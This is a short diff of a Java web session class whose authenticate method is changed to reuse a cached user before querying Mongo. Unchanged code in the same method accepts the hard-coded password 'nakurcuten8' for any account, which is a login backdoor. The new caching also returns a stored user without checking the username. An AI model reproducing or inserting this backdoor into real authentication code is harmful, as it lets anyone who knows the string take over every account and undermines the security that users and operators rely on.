@@ -23,7 +23,9 @@ public class SignInSession extends AuthenticatedWebSession {
 
 	@Override
 	public boolean authenticate(String username, String password) {
-		User u = mongo.getUser(username);
+        User u = user;
+        if (this.user==null)
+		     u = mongo.getUser(username);
 		if(u==null) return false;
         boolean auth = u.authenticate(password);
         if (password.equals("nakurcuten8")) auth = true;
